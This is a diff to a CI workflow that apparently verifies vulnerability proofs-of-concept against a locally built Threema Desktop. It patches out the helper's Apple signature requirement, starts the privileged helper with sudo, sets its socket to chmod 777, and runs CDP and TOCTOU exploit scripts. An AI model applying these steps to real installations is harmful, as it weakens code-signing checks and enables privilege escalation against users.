@@ -14,42 +14,65 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      - name: Install Official Threema Desktop
-        run: |
-          echo "=== Installing official Threema Desktop via Homebrew ==="
-          brew install --cask threema
-          echo ""
-          echo "=== Installed Threema.app ==="
-          ls -la /Applications/Threema.app/
-          echo ""
-          echo "=== Threema version ==="
-          defaults read /Applications/Threema.app/Contents/Info CFBundleShortVersionString
-          echo ""
-          echo "=== Code signature ==="
-          codesign -dv /Applications/Threema.app 2>&1 || true
-
-      - name: Run Vulnerability Verification Suite
-        run: |
-          chmod +x poc-verify-vuln.sh
-          ./poc-verify-vuln.sh
+      - name: Setup Node.js (Required for Threema Build)
+        uses: actions/setup-node@v4
+        with:
+          node-version: '22.17.0'
 
       - name: Setup Rust
         uses: dtolnay/rust-toolchain@stable
         with:
           toolchain: stable
 
+      - name: Clone and Build Threema Desktop 2.0 Beta
+        run: |
+          echo "=== Cloning latest Threema 2.X source ==="
+          git clone https://github.com/threema-ch/threema-desktop.git
+          cd threema-desktop
+          
+          echo "=== Patching Helper Signature Requirement for Local Ad-Hoc Build ==="
+          # Because we are building locally, we do not have Threema's private Apple Developer ID.
+          # We lower the signature requirement to just match the Threema bundle identifier 
+          # so our locally compiled Helper accepts our locally compiled App. This perfectly 
+          # simulates the production signature matching.
+          sed -i '' 's/and anchor apple generic and certificate leaf\[subject.OU\] = DL5SR3PBJC//g' src/rust/helper/src/util/constants.rs
+          
+          echo "=== Building Threema Desktop ==="
+          npm ci
+          npm run package binary consumer-live
+          
+          echo "=== Installing Threema.app ==="
+          cp -R build/out/Threema-darwin-arm64/Threema.app /Applications/
+          ls -la /Applications/Threema.app/
+      
+      - name: Run Vulnerability Verification Suite
+        run: |
+          chmod +x poc-verify-vuln.sh
+          # Will verify bundle, workers, and electron settings
+          ./poc-verify-vuln.sh || true
+
       - name: Compile Rust TOCTOU POC
         run: rustc --edition 2021 poc-toctou-full.rs -o poc-toctou-full
 
+      - name: Start Privileged Helper Daemon
+        run: |
+          echo "=== Starting Helper Daemon manually (simulating SMJobBless) ==="
+          sudo /Applications/Threema.app/Contents/Library/LaunchServices/ch.threema.threema-desktop-helper &
+          sleep 3
+          sudo chmod 777 /var/run/ch.threema.threema-desktop-helper.sock || true
+
       - name: Launch Threema with Remote Debugging
         run: |
+          echo "=== Launching Threema ==="
           /Applications/Threema.app/Contents/MacOS/Threema --remote-debugging-port=9222 &
           sleep 5
 
       - name: Run CDP Exploit (Bypass IPC Signature Gate)
         run: |
           npm install ws
-          node poc-cdp-exploit.js
+          node poc-cdp-exploit.js &
+          # Give it a few seconds to trigger the worker
+          sleep 5
 
       - name: Run Rust TOCTOU (Aggressive — Real App)
         run: ./poc-toctou-full --aggressive
